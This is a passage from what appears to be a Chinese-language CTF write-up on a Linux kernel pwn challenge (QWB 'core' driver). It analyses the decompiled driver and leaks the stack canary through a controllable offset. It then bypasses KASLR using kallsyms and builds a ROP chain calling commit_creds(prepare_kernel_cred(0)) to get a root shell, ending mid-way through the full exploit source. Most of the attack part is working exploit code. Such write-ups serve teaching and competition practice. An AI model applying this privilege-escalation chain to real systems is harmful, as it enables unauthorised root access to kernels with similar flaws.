    v3 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v3 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v6<span class="token punctuation">,</span> <span class="token string">"Welcome to the QWB CTF challenge.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  result <span class="token operator">=</span> <span class="token function">copy_to_user</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v6 <span class="token operator">+</span> off<span class="token punctuation">,</span> <span class="token number">64LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>result <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token function">__readgsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v7<span class="token punctuation">;</span>
  __asm <span class="token punctuation">{</span> swapgs <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>注意到result这里 执行了copy_to_user（）函数</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>在学习Linux内核驱动的时候，经常会碰到copy_from_user和copy_to_user这两个函数，设备驱动程序中的ioctl函数就经常会用到。这两个函数负责在用户空间和内核空间传递数据
</code></pre><p>查看下他们的定义</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">copy_from_user：

<span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>to<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> __user <span class="token operator">*</span>from<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> n<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">access_ok</span><span class="token punctuation">(</span>VERIFY_READ<span class="token punctuation">,</span> from<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span>
        n <span class="token operator">=</span> <span class="token function">__arch_copy_from_user</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span> from<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span> <span class="token comment" spellcheck="true">/* security hole - plug it */</span>
        <span class="token function">memzero</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> n<span class="token punctuation">;</span>
<span class="token punctuation">}</span>


copy_to_user：

 <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token function">copy_to_user</span><span class="token punctuation">(</span><span class="token keyword">void</span> __user <span class="token operator">*</span>to<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>from<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> n<span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">access_ok</span><span class="token punctuation">(</span>VERIFY_WRITE<span class="token punctuation">,</span> to<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span>
           n <span class="token operator">=</span> <span class="token function">__copy_to_user</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span> from<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> n<span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
</code></pre>
<p>其中函数的三个参数含义为：<em>to是内核空间的指针，</em>from是用户空间指针，n表示从用户空间想内核空间拷贝数据的字节数。如果成功执行拷贝操作，则返回0，否则返回还没有完成拷贝的字节数</p>
<h3 id="—————————————"><a href="#—————————————" class="headerlink" title="—————————————"></a>—————————————</h3><p>其中access_ok()是</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">ifdef</span> CONFIG_MMU</span>
  <span class="token macro property">#<span class="token directive keyword">define</span> access_ok(type,addr,size) (likely(__range_ok(addr,size) == 0))</span>
<span class="token macro property">#<span class="token directive keyword">else</span></span>
  <span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">int</span> <span class="token function">access_ok</span><span class="token punctuation">(</span><span class="token keyword">int</span> type<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> size<span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
  <span class="token keyword">extern</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> memory_start<span class="token punctuation">,</span> memory_end<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> val <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>addr<span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>val <span class="token operator">>=</span> memory_start<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>val <span class="token operator">+</span> size<span class="token punctuation">)</span> <span class="token operator">&lt;</span> memory_end<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
</code></pre>
<p>返回再看函数</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">result <span class="token operator">=</span> <span class="token function">copy_to_user</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v6 <span class="token operator">+</span> off<span class="token punctuation">,</span> <span class="token number">64LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>查看下汇编</p>
<p></p><p class="code-caption" data-lang="asm" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-asm"><code class="language-asm">.text:00000000000000AB                 mov     rsi, offset src ; "Welcome to the QWB CTF challenge.\n"
.text:00000000000000B2                 mov     rdi, rsp        ; dest
.text:00000000000000B5                 call    strcpy
.text:00000000000000BA                 mov     rsi, rsp
.text:00000000000000BD                 add     rsi, cs:off
.text:00000000000000C4                 mov     edx, 40h ; '@'
.text:00000000000000C9                 mov     rdi, rbx
.text:00000000000000CC                 call    _copy_to_user
.text:00000000000000D1                 test    rax, rax
.text:00000000000000D4                 jz      short loc_DB
</code></pre>
<p>看到v6其实就是rsp 而off又是我们可以控制设置的 传入 0x6677889C  ，所以利用好这个点 可以leak canary（从0位开始获取）以及内核函数地址</p>
<p>canary = rsp+ 0x40<br>所以设置off为0x40</p>
<p>程序基本分析完毕<br>1.存在溢出 可以利用执行rop<br>2.off可控 利用v6+off leak canary<br>3.因为给出静态vmlinux //可以直接在此中查找gadget</p>
<ol start="4">
<li>给出vmlinux 并且启动环境后会将/proc/kallsyms写入tmp/ kallsyms查找commit_creds，prepare_kernel_cred<br>5.虽然开启了kaslr 但是可以通过commit_creds，prepare_kernel_cred 计算出找vmlinux base</li>
</ol>
<p>利用ropgadget提取gadget 过于缓慢 …(CTFwiki suggest use Ropper)<br>所以我们用Ropper提取gadget</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">➜  give_to_player ropper --file ./vmlinux --nocolor <span class="token operator">></span> g1
<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> Load gadgets from cache
<span class="token punctuation">[</span>LOAD<span class="token punctuation">]</span> loading<span class="token punctuation">..</span>. 100%
<span class="token punctuation">[</span>LOAD<span class="token punctuation">]</span> removing double gadgets<span class="token punctuation">..</span>. 100%
</code></pre>
<h3 id="offset-计算exp"><a href="#offset-计算exp" class="headerlink" title="offset 计算exp"></a>offset 计算exp</h3><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">➜  give_to_player checksec vmlinux
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/kernel/croe/give_to_player/vmlinux'</span>
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE <span class="token punctuation">(</span>0xffffffff81000000<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#raw_vmlinux_base</span>
    RWX:      Has RWX segments
</code></pre>
<pre class=" language-C"><code class="language-C">#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
size_t commit_creds = 0, prepare_kernel_cred = 0;
size_t raw_vmlinux_base = 0xffffffff81000000;
size_t vmlinux_base = 0;
size_t find_symbols()
{
    FILE* kallsyms_fd = fopen("/tmp/kallsyms", "r");

    if(kallsyms_fd < 0)
    {
        puts("[*]open kallsyms error!");
        exit(0);
    }

    char buf[0x30] = {0};
    while(fgets(buf, 0x30, kallsyms_fd))
    {
        if(commit_creds & prepare_kernel_cred)
            return 0;

        if(strstr(buf, "commit_creds") && !commit_creds)
        {
            /* puts(buf); */
            char hex[20] = {0};
            strncpy(hex, buf, 16);
            /* printf("hex: %s\n", hex); */
            sscanf(hex, "%llx", &commit_creds);
            printf("commit_creds addr: %p\n", commit_creds);

            vmlinux_base = commit_creds - 0x9c8e0;
            printf("vmlinux_base addr: %p\n", vmlinux_base);
        }

        if(strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred)
        {
            /* puts(buf); */
            char hex[20] = {0};
            strncpy(hex, buf, 16);
            sscanf(hex, "%llx", &prepare_kernel_cred);
            printf("prepare_kernel_cred addr: %p\n", prepare_kernel_cred);
            vmlinux_base = prepare_kernel_cred - 0x9cce0;
            /* printf("vmlinux_base addr: %p\n", vmlinux_base); */
        }
    }

    if(!(prepare_kernel_cred & commit_creds))
    {
        puts("[*]Error!");
        exit(0);
    }

}
int main(void){

find_symbols();
unsigned long long offset = vmlinux_base - raw_vmlinux_base;
printf("{==dbg==} leak offset: %p\n",(void*)offset);
}
<p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p>
</code></pre>
<h3 id="平衡堆栈"><a href="#平衡堆栈" class="headerlink" title="平衡堆栈"></a>平衡堆栈</h3><p>就像刚开始说的一样 内核态与用户态pwn的差别  内核态还需要稳定堆栈<br>在内核返回用户态的时候，会调用iretq，iretq会依次弹出 rip cs eflags rsp ss之后做一些判断，如果不能构造好这些参数，系统会崩溃<br>这里采取提前保存的方式来稳定堆栈</p>
<pre class=" language-C"><code class="language-C">static void save_state() {
    asm(
    "movq %%cs, %0\n"
    "movq %%ss, %1\n"
    "pushfq\n"
    "popq %2\n"
    : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory");
}
</code></pre>
<h3 id="Set-off-and-Leak-canary"><a href="#Set-off-and-Leak-canary" class="headerlink" title="Set off and Leak canary"></a>Set off and Leak canary</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span>page <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x400000</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> ret<span class="token punctuation">;</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token macro property">#use to fake stack</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} set off"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ret <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x6677889C</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property">#set off =0x40</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} ret: %d\n"</span><span class="token punctuation">,</span>ret<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} copy to user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ret <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x6677889b</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property">#set case = 0x6677889b into core_read than leak canary</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} ret: %d\n"</span><span class="token punctuation">,</span>ret<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> canary <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} canary: %p\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>canary<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>有了cananry 就可以构造rop了</p>
<h3 id="ROP-to-getshell-and-ret-user"><a href="#ROP-to-getshell-and-ret-user" class="headerlink" title="ROP to getshell and ret user"></a>ROP to getshell and ret user</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> rop_buf<span class="token punctuation">[</span><span class="token number">0x1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span> rop <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>rop_buf<span class="token punctuation">;</span>
    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> canary<span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//rbx</span>
    <span class="token comment" spellcheck="true">//ret</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff81000b2f</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//pop rdi ; ret</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff8109cce0</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//prepare_kernel_cred</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff810a0f49</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//pop rdx ; ret</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff8109c8e0</span><span class="token operator">+</span><span class="token number">2</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//commit_creds</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff8101aa6a</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//mov rdi, rax ; call rdx</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff81a012da</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//swapgs ; popfq ; ret</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff81050ac2</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//iretq</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>shell<span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_cs<span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_rflags<span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page<span class="token operator">+</span><span class="token number">0x400000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_ss<span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>rop_buf<span class="token punctuation">,</span><span class="token number">0x800</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ret <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x6677889a</span><span class="token punctuation">,</span><span class="token number">0xffffffffffff0000</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>要注意在getshell前，提前save_state </p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span>

<span class="token keyword">unsigned</span> <span class="token keyword">long</span> user_cs<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> user_ss<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> user_rflags<span class="token punctuation">;</span>
size_t commit_creds <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> prepare_kernel_cred <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
size_t raw_vmlinux_base <span class="token operator">=</span> <span class="token number">0xffffffff81000000</span><span class="token punctuation">;</span>
size_t vmlinux_base <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
size_t <span class="token function">find_symbols</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    FILE<span class="token operator">*</span> kallsyms_fd <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/tmp/kallsyms"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">/* FILE* kallsyms_fd = fopen("./test_kallsyms", "r"); */</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>kallsyms_fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*]open kallsyms error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> kallsyms_fd<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>commit_creds <span class="token operator">&amp;</span> prepare_kernel_cred<span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"commit_creds"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>commit_creds<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true">/* puts(buf); */</span>
            <span class="token keyword">char</span> hex<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
            <span class="token function">strncpy</span><span class="token punctuation">(</span>hex<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">/* printf("hex: %s\n", hex); */</span>
            <span class="token function">sscanf</span><span class="token punctuation">(</span>hex<span class="token punctuation">,</span> <span class="token string">"%llx"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"commit_creds addr: %p\n"</span><span class="token punctuation">,</span> commit_creds<span class="token punctuation">)</span><span class="token punctuation">;</span>

            vmlinux_base <span class="token operator">=</span> commit_creds <span class="token operator">-</span> <span class="token number">0x9c8e0</span><span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"vmlinux_base addr: %p\n"</span><span class="token punctuation">,</span> vmlinux_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"prepare_kernel_cred"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>prepare_kernel_cred<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true">/* puts(buf); */</span>
            <span class="token keyword">char</span> hex<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
            <span class="token function">strncpy</span><span class="token punctuation">(</span>hex<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">sscanf</span><span class="token punctuation">(</span>hex<span class="token punctuation">,</span> <span class="token string">"%llx"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"prepare_kernel_cred addr: %p\n"</span><span class="token punctuation">,</span> prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">;</span>
            vmlinux_base <span class="token operator">=</span> prepare_kernel_cred <span class="token operator">-</span> <span class="token number">0x9cce0</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">/* printf("vmlinux_base addr: %p\n", vmlinux_base); */</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>prepare_kernel_cred <span class="token operator">&amp;</span> commit_creds<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*]Error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
